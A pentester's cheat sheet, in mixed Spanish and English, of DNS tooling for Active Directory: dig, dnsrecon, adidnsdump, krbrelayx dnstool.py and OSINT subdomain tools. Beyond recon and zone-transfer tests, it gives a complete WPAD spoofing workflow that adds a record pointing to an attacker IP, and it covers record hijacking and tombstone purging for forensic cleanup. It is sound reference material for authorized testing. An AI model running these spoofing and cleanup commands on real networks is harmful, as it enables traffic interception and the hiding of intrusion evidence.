---
aliases:
  - DNS Tooling AD
  - dig
  - dnsrecon
  - adidnsdump
  - krbrelayx dnstool
tags:
  - type/tool
  - vuln/ad-enumeration
  - technique/discovery
  - asset/active-directory
  - asset/dns
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - DNS & SRV Records]]"
---
# AD - DNS & SRV Records - Tooling

***

## dig (BIND DNS Lookup)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `dig +short A <host>.<dom>` | IP del host | Standard lookup. |
| `dig +short AAAA <host>.<dom>` | IPv6 | Hybrid. |
| `dig +short SRV _ldap._tcp.dc._msdcs.<dom>` | DCs | AD core discovery. |
| `dig +short MX <dom>` | Mail servers | Email infra. |
| `dig +short NS <dom>` | Name servers authoritative | Identificar DNS servers. |
| `dig +short SOA <dom>` | SOA (master + serial + refresh) | Zone metadata. |
| `dig +short TXT <dom>` | SPF/DKIM/etc | Email auth, OSINT. |
| `dig +short -x <ip>` | PTR reverse | Hostname desde IP. |
| `dig +noall +answer SRV <name>` | Output SRV con priority/weight visibles | Parse manual. |
| `dig +trace <dom>` | Path completo de resolución | Debug delegation. |
| `dig +norec <name> @<server>` | Sin recursión, solo authoritative | Identificar authoritative. |
| `dig @<DC> <dom>` | Query a DC específico | Compare DCs. |
| `dig AXFR <dom> @<DC>` | Zone transfer | Test misconfig. |
^ad-tool-dig

```bash
DOM="corp.local"

# Pipeline AD discovery
dig +short SRV "_ldap._tcp.dc._msdcs.$DOM" | awk '{print $4}' | sed 's/\.$//' |
  while read fqdn; do
    echo "$fqdn -> $(dig +short A $fqdn)"
  done

# AXFR test contra todos DCs
for dc in $(dig +short NS "$DOM"); do
  dig AXFR "$DOM" "@$dc" +short | head -5
done
```

___

## dnsrecon / dnsenum / fierce

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `dnsrecon -d <dom>` | std + axfr + srv + brt en uno | Recon completo. |
| `dnsrecon -d <dom> -t axfr` | Solo AXFR | Test targeted. |
| `dnsrecon -d <dom> -t srv` | Solo SRV records AD | Bootstrap AD. |
| `dnsrecon -d <dom> -t brt -D wordlist.txt` | Subdomain brute | Sin AXFR. |
| `dnsrecon -r 10.0.0.0/24` | Reverse PTR sweep | Network mapping. |
| `dnsrecon -d <dom> -j out.json` | JSON parseable | Pipeline. |
| `dnsenum --threads 20 <dom>` | Multi-mode threaded | Alt tool. |
| `fierce --domain <dom>` | Brute + zone walk | Alt tool. |
^ad-tool-dnsrecon

```bash
# Pipeline standard
dnsrecon -d corp.local -n <DC-IP> -t std,axfr,srv,brt \
  -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -j corp_dns.json

# Parse JSON — solo A records
jq '.[] | select(.type=="A") | {name, address}' corp_dns.json
```

___

## adidnsdump (DNS via LDAP)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `pip install git+https://github.com/dirkjanm/adidnsdump` | Install | Setup. |
| `adidnsdump -u 'corp\u' -p pass <DC>` | Default zone records | Standard enum. |
| `adidnsdump -u 'corp\u' -p pass <DC> --print-zones` | Lista zones | Discovery. |
| `adidnsdump -u 'corp\u' -p pass <DC> -r --zone <zone>` | Records con DNS resolve | Verify. |
| `adidnsdump -u 'corp\u' -p pass <DC> --include-tombstoned` | Tombstoned records | Persistence hunt. |
| `adidnsdump -u 'corp\u' -p pass <DC> -k` | Kerberos auth | Sin password en línea. |
| `adidnsdump -u 'corp\u' -p pass <DC> --ssl` | LDAPS | Encrypted. |
^ad-tool-adidns

**Por qué:** AXFR puede estar cerrado, pero LDAP read sobre `DomainDnsZones` está habilitado para `Authenticated Users`. También expone records ANY que DNS server no advertise.

```bash
# Pipeline cred hunt en records
adidnsdump -u 'corp\auditor' -p pass <DC> -r > records.csv

# Records sospechosos
grep -E "wpad|isatap|^_kerberos|^_ldap|^\*" records.csv
```

___

## dnstool.py (krbrelayx — DNS Manipulation)

| **Comando** | **Acción** | **Cuándo** |
|:---:|:---:|:---:|
| `dnstool.py -u 'corp\u' -p pass -a query -r <name> <DC>` | Read record | Pre-modify check. |
| `dnstool.py -u 'corp\u' -p pass -a add -r <name> -d <ip> <DC>` | Add A record | Spoof / WPAD. |
| `dnstool.py -u 'corp\u' -p pass -a add -r <name> -d <target> -t CNAME <DC>` | Add CNAME | Aliasing. |
| `dnstool.py -u 'corp\u' -p pass -a modify -r <name> -d <new-ip> <DC>` | Modify A | Hijack. |
| `dnstool.py -u 'corp\u' -p pass -a remove -r <name> <DC>` | Soft remove (tombstone) | Cleanup. |
| `dnstool.py -u 'corp\u' -p pass -a remove -r <name> --remove-tombstone <DC>` | Purge tombstone | Forensic cleanup. |
| `dnstool.py -u 'corp\u' -p pass -a ldapdelete -r <name> <DC>` | Delete object directo | Edge. |
^ad-tool-dnstool

**Default DACL** = `Authenticated Users` con `CreateChild` sobre el zone object. Cualquier user del domain puede crear records.

```bash
# WPAD spoof completo
git clone https://github.com/dirkjanm/krbrelayx
cd krbrelayx

# Add
python3 dnstool.py -u 'corp\u' -p pass -a add -r wpad -d <attacker-IP> <DC>

# Verify
dig +short A wpad.corp.local @<DC>

# Cleanup (siempre)
python3 dnstool.py -u 'corp\u' -p pass -a remove -r wpad <DC>
python3 dnstool.py -u 'corp\u' -p pass -a remove -r wpad --remove-tombstone <DC>
```

___

## OSINT / External DNS Recon

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `subfinder -d <dom> -all -silent` | Subdomains multi-source | Pre-engagement OSINT. |
| `amass enum -passive -d <dom>` | Passive aggregation | Pre-engagement. |
| `amass intel -d <dom>` | Intel (IP ranges, ASNs) | Recon broader. |
| `findomain -t <dom>` | Rust fast | Quick OSINT. |
| `curl -s "https://crt.sh/?q=%25.<dom>&output=json" \| jq -r '.[].name_value'` | Cert transparency subdomains | OSINT classic. |
| `dnsx -resp-only -silent -l subs.txt` | Resolver bulk | Post-discovery. |
| `httpx -title -web-server -tech-detect -l subs.txt` | HTTP probing post-DNS | Live host enrichment. |
| `gobuster dns -d <dom> -r <DC-IP> -w wordlist -t 50` | Active brute con DNS resolver custom | Internal recon. |
| `puredns bruteforce wordlist.txt <dom> -r resolvers.txt` | Massdns wrapper | Bulk performance. |
^ad-tool-cloud

```bash
DOM="corp.local"

# Aggregate sources
subfinder -d "$DOM" -all -silent > subs.txt
amass enum -passive -d "$DOM" >> subs.txt
curl -s "https://crt.sh/?q=%25.$DOM&output=json" | jq -r '.[].name_value' >> subs.txt
sort -u subs.txt > unique.txt

# Resolve + probe
cat unique.txt | dnsx -resp-only -silent > live.txt
cat unique.txt | httpx -title -web-server -tech-detect -silent
```

___

## Wordlists & Recursos

| **Recurso** | **Path / URL** |
|:---:|:---:|
| SecLists DNS | `/usr/share/seclists/Discovery/DNS/` |
| `subdomains-top1million-5000.txt` | SecLists (quick) |
| `subdomains-top1million-110000.txt` | SecLists (deep) |
| AssetNote wordlists | `https://wordlists.assetnote.io/` |
| commonspeak2 | `https://github.com/assetnote/commonspeak2-wordlists` |
| HackTricks DNS | `https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns` |
| RFC 1035 (DNS) | `https://datatracker.ietf.org/doc/html/rfc1035` |
| RFC 2782 (SRV) | `https://datatracker.ietf.org/doc/html/rfc2782` |
| RFC 5936 (AXFR) | `https://datatracker.ietf.org/doc/html/rfc5936` |
| `awesome-active-directory` | `https://github.com/Orange-Cyberdefense/awesome-activedirectory` |
^ad-tool-wordlists

***
